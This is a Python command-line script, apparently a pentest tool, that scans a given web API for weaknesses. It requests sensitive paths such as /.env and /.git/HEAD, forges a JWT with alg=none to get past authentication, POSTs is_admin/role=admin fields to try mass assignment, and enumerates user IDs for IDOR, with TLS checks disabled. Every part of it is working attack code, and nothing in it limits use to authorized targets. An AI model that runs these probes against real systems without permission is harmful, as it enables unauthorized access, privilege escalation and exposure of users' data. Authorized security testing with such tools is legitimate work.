#!/usr/bin/env python3
"""API Security 快速扫描 — 未授权端点/JWT弱密钥/Mass Assignment/IDOR探测"""
import json, sys, argparse, re
import urllib.request, urllib.error, ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

UA = "Mozilla/5.0 API-Audit/1.0"

def req(url, method="GET", data=None, headers=None, timeout=8):
    h = {"User-Agent": UA}
    if headers:
        h.update(headers)
    body = json.dumps(data).encode() if data else None
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        return resp.status, resp.read().decode(errors="replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        return e.code, body, dict(e.headers)
    except Exception as e:
        return None, str(e), {}


def check_open_endpoints(base):
    """检查常见未授权端点"""
    paths = [
        "/api", "/api/v1", "/api/users", "/api/admin", "/graphql",
        "/swagger.json", "/openapi.json", "/api-docs", "/docs",
        "/.env", "/debug", "/actuator", "/actuator/health",
        "/api/health", "/api/status", "/api/config",
        "/.well-known/openid-configuration",
        "/api/auth/login", "/api/auth/register",
        "/.git/HEAD", "/admin", "/phpinfo.php",
    ]
    findings = []
    for p in paths:
        url = base.rstrip("/") + p
        code, body, _ = req(url)
        if code and code not in (404, 403, 405):
            preview = body[:100].replace("\n", " ") if body else ""
            findings.append({"path": p, "status": code, "preview": preview})
    return findings


def check_jwt_alg_none(url, token):
    """检查JWT none算法绕过"""
    parts = token.split(".")
    if len(parts) != 3:
        return "Not a valid JWT"
    import base64
    try:
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "===").decode())
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "===").decode())
        orig_alg = header.get("alg", "?")
        # 改 alg=none
        header["alg"] = "none"
        new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
        new_token = f"{new_header}.{parts[1]}."
        code, body, _ = req(url, headers={"Authorization": f"Bearer {new_token}"})
        if code and code < 400:
            return f"🔴 JWT none bypass SUCCESS (orig alg={orig_alg}) — status {code}"
        return f"⚪ JWT none bypass rejected (orig alg={orig_alg})"
    except Exception as e:
        return f"JWT parse error: {e}"


def check_mass_assignment(url):
    """检查Mass Assignment — 尝试注入is_admin/role字段"""
    payloads = [
        {"username": "test_user", "email": f"test{id(check_mass_assignment)}@test.com", "is_admin": True, "role": "admin"},
        {"username": "test_user", "email": f"test{id(check_mass_assignment)}@test.com", "isAdmin": True, "is_superuser": True},
    ]
    findings = []
    for data in payloads:
        code, body, _ = req(url, method="POST", data=data)
        if code and code < 400:
            findings.append({"status": code, "payload": data, "response": body[:200]})
    return findings


def check_idor(base):
    """快速IDOR探测 — 尝试相邻ID"""
    import random
    findings = []
    for _ in range(5):
        uid = random.randint(1, 100)
        for path in ["/api/users/", "/api/user/", "/api/profile/", "/api/account/"]:
            url = base.rstrip("/") + path + str(uid)
            code, body, _ = req(url)
            if code == 200 and body and len(body) > 50:
                findings.append({"url": url, "status": code, "preview": body[:120]})
                break
    return findings


def scan(base, token=None):
    report = {"target": base, "findings": []}

    open_eps = check_open_endpoints(base)
    if open_eps:
        report["findings"].append({"type": "open_endpoints", "count": len(open_eps), "items": open_eps})

    if token:
        jwt_result = check_jwt_alg_none(base + "/api/me", token)
        report["findings"].append({"type": "jwt", "result": jwt_result})

    mass = check_mass_assignment(base + "/api/users")
    if mass:
        report["findings"].append({"type": "mass_assignment", "items": mass})

    idors = check_idor(base)
    if idors:
        report["findings"].append({"type": "idor_check", "items": idors})

    return report


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("url", help="API base URL")
    p.add_argument("--token", help="JWT token")
    p.add_argument("--endpoints", action="store_true", help="Only check open endpoints")
    args = p.parse_args()

    if args.endpoints:
        for ep in check_open_endpoints(args.url):
            print(f"  {ep['path']} → {ep['status']}")
    else:
        result = scan(args.url, args.token)
        print(json.dumps(result, ensure_ascii=False, indent=2))
